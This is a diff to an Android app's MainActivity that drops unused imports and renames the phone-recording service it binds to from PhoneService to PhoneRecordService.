@@ -24,10 +24,8 @@ import android.widget.Toast;
 import com.view.core.MyApplication;
 import com.view.core.aidl.OnPhoneRecordListener;
 import com.view.core.aidl.OnScreenRecordListener;
-import com.view.core.aidl.PhoneRecord;
 import com.view.core.aidl.ScreenRecord;
-import com.view.core.services.PhoneRecordBinder;
-import com.view.core.services.PhoneService;
+import com.view.core.services.PhoneRecordService;
 import com.view.core.services.ScreenRecordBinder;
 import com.view.core.services.ScreenRecordService;
 import com.view.core.thread.ClientThread;
@@ -38,12 +36,11 @@ import com.view.core.utils.ScreenRecordUtil;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
-import java.io.InputStreamReader;
+
 import com.view.core.activitys.PhoneRecordActivity.PhoneServiceConnection;
 
 import Android.view.core.R;
@@ -78,7 +75,7 @@ public class MainActivity extends Activity {
 
         if(requestPermission()){
             Log.d(TAG, "start phone service...");
-            Intent intent = new Intent(this, PhoneService.class);
+            Intent intent = new Intent(this, PhoneRecordService.class);
             bindService(intent, getPhoneServiceConnection(), BIND_AUTO_CREATE);
         }
 
@@ -269,7 +266,7 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if(requestCode == REQUEST_RECORD_PERMISSION_RESULT){
             Log.d(TAG, "start phone service...");
-            Intent intent = new Intent(this, PhoneService.class);
+            Intent intent = new Intent(this, PhoneRecordService.class);
             bindService(intent,  getPhoneServiceConnection(), BIND_AUTO_CREATE);
         }else if(requestCode == REQUEST_SCREEN_PERMISSION_RESULT){
             Log.d(TAG, "onActivityResult: start to screen service...");
